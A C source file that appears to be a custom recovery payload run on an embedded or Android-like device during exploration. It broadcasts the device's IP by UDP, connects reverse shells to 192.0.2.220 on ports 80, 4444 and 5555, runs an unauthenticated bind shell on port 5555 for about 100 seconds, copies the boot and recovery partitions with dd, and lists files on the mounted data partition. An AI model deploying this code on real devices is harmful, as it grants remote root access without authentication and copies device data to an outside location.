#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

static int SFD = 1;
static const char *ENV[] = { "PATH=/sbin:/system/bin:/system/xbin:/usr/bin",
                             "HOME=/", NULL };
static char myip[64] = "?";

static void up(const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf + 9, sizeof(buf) - 10, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    memcpy(buf, "ui_print ", 9);
    int len = 9 + n;
    buf[len++] = '\n';
    write(SFD, buf, len);
}

static void runsh(const char *cmd)
{
    int pfd[2];
    if (pipe(pfd) < 0) { up("pipe fail"); return; }
    pid_t pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], 1);
        dup2(pfd[1], 2);
        close(pfd[1]);
        char *av[] = { (char *)"/sbin/sh", (char *)"-c", (char *)cmd, NULL };
        execve("/sbin/sh", av, (char **)ENV);
        _exit(127);
    }
    close(pfd[1]);
    char b[512];
    int n;
    while ((n = read(pfd[0], b, sizeof(b) - 1)) > 0) {
        b[n] = 0;
        char *r = b, *e;
        while ((e = strchr(r, '\n')) != NULL) {
            *e = 0;
            up("  %s", r);
            r = e + 1;
        }
        if (*r) up("  %s", r);
    }
    close(pfd[0]);
    int st;
    waitpid(pid, &st, 0);
}

static void catfile(const char *p, int maxlines)
{
    FILE *f = fopen(p, "r");
    up("-- %s %s", p, f ? "OK" : "FAIL");
    if (!f) return;
    char b[512];
    int i = 0;
    while (fgets(b, sizeof(b), f) && i++ < maxlines) {
        char *nl = strchr(b, '\n');
        if (nl) *nl = 0;
        up("  %s", b);
    }
    fclose(f);
}

static int try_connect(const char *ip, int port, int timeout_ms)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);
    int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    if (r < 0 && errno == EINPROGRESS) {
        fd_set ws;
        FD_ZERO(&ws);
        FD_SET(fd, &ws);
        struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
        r = select(fd + 1, NULL, &ws, NULL, &tv);
        if (r > 0) {
            int err = 0;
            socklen_t el = sizeof(err);
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el);
            errno = err;
            r = err ? -1 : 0;
        } else { errno = ETIMEDOUT; r = -1; }
    }
    if (r < 0) { close(fd); return -1; }
    fcntl(fd, F_SETFL, fl);
    return fd;
}

static void shell_on(int fd)
{
    pid_t pid = fork();
    if (pid == 0) {
        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
        char *av[] = { (char *)"/sbin/sh", (char *)"-", NULL };
        execve("/sbin/sh", av, (char **)ENV);
        _exit(1);
    }
}

int main(int argc, char **argv)
{
    if (argc > 2) SFD = atoi(argv[2]);
    up("R4-START");

    /* --- who am I (pure C) --- */
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, "eth0");
    if (ioctl(s, SIOCGIFADDR, &ifr) == 0) {
        strcpy(myip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    }
    up("  eth0 ip=%s errno=%d", myip, errno);
    short flags2 = 0;
    if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) flags2 = ifr.ifr_flags;
    up("  eth0 flags=0x%x (UP=%d RUNNING=%d)", flags2,
       !!(flags2 & IFF_UP), !!(flags2 & IFF_RUNNING));
    catfile("/sys/class/net/eth0/carrier", 1);
    catfile("/sys/class/net/eth0/operstate", 1);

    FILE *f = fopen("/udisk/net.txt", "w");
    if (f) { fprintf(f, "ip=%s flags=0x%x\n", myip, flags2); fclose(f); }

    /* --- UDP beacon so VM learns our IP --- */
    {
        int us = socket(AF_INET, SOCK_DGRAM, 0);
        struct sockaddr_in ba;
        memset(&ba, 0, sizeof(ba));
        ba.sin_family = AF_INET;
        ba.sin_port = htons(5556);
        ba.sin_addr.s_addr = inet_addr("255.255.255.255");
        int one = 1;
        setsockopt(us, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
        char msg[128];
        int n = snprintf(msg, sizeof(msg), "BOX-RECOVERY ip=%s flags=0x%x", myip, flags2);
        for (int i = 0; i < 5; i++) {
            sendto(us, msg, n, 0, (struct sockaddr *)&ba, sizeof(ba));
            sleep(1);
        }
        close(us);
        up("  beacon sent x5");
    }

    runsh("/sbin/busybox ifconfig -a 2>&1 | head -40");
    runsh("/sbin/busybox ping -c 2 -w 4 192.0.2.1 2>&1; /sbin/busybox ping -c 2 -w 4 192.0.2.220 2>&1");

    /* --- reverse shells --- */
    int ports[] = { 80, 4444, 5555 };
    for (unsigned i = 0; i < 3; i++) {
        int fd = try_connect("192.0.2.220", ports[i], 4000);
        up("  rev %d -> %s errno=%d", ports[i], fd >= 0 ? "OK" : "fail", fd >= 0 ? 0 : errno);
        if (fd >= 0) { shell_on(fd); close(fd); }
        else close(fd);
    }

    /* --- bind shell on 5555, accept loop ~100s --- */
    {
        int ls = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1;
        setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(5555);
        sa.sin_addr.s_addr = INADDR_ANY;
        if (bind(ls, (struct sockaddr *)&sa, sizeof(sa)) == 0 && listen(ls, 4) == 0) {
            up("  bind 5555 OK, accepting 100s");
            time_t t0 = time(NULL);
            while (time(NULL) - t0 < 100) {
                fd_set rs;
                FD_ZERO(&rs);
                FD_SET(ls, &rs);
                struct timeval tv = { 5, 0 };
                if (select(ls + 1, &rs, NULL, NULL, &tv) > 0) {
                    int c = accept(ls, NULL, NULL);
                    if (c >= 0) { shell_on(c); close(c); up("  accepted one"); }
                }
            }
        } else up("  bind fail errno=%d", errno);
        close(ls);
    }

    /* --- block device truth --- */
    runsh("/sbin/busybox ls -l /dev/block/ 2>&1 | head -40");
    runsh("/sbin/busybox ls -l /dev/block/by-name/ 2>&1 | head -30; /sbin/busybox ls -l /dev/by-name/ 2>&1 | head -5");
    runsh("for p in /dev/block/platform/*/by-name; do /sbin/busybox ls -l $p; done 2>&1 | head -30");

    /* --- backups via busybox dd --- */
    runsh("/sbin/busybox dd if=/dev/block/by-name/boot of=/udisk/boot_backup.img bs=8M 2>&1 | /sbin/busybox tail -2");
    runsh("/sbin/busybox dd if=/dev/block/by-name/recovery of=/udisk/recovery_backup.img bs=8M 2>&1 | /sbin/busybox tail -2");
    runsh("/sbin/busybox ls -l /udisk/ 2>&1");

    /* --- data mount --- */
    mkdir("/mnt/rwd", 0755);
    int m = mount("/dev/block/by-name/data", "/mnt/rwd", "ext4", MS_RDONLY, "");
    up("  data mount rc=%d errno=%d", m, m ? errno : 0);
    if (m == 0) {
        runsh("/sbin/busybox ls /mnt/rwd > /udisk/datalist.txt 2>&1; "
              "/sbin/busybox ls -la /mnt/rwd/property >> /udisk/datalist.txt 2>&1; "
              "/sbin/busybox head -40 /udisk/datalist.txt");
        runsh("/sbin/busybox umount /mnt/rwd");
    }
    up("done-marker-reached");
    write(SFD, "done\n", 5);
    return 0;
}
